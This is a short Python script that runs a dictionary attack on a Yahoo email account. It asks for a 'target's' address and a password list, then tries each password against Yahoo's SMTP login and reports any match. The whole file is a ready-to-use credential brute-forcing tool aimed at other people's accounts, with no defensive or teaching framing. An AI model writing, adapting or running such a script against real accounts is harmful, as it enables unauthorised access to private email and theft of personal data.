import smtplib
import time

smtpserver = smtplib.SMTP("smtp.mail.yahoo.com", 587)   
smtpserver.ehlo() # Says hello to the smtp server
smtpserver.starttls()

print ("")
user = input("Enter the target's yahoo address: ")
passwfile = input ("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try: 
        smtpserver.login(user, password)
        print ("[+] Passsword Found: %s" %password)
        print ("")
        time.sleep(1)

    except smtplib.SMTPAuthenticationError:
        print ("")
        print ("[!] Password wrong: %s" %password)


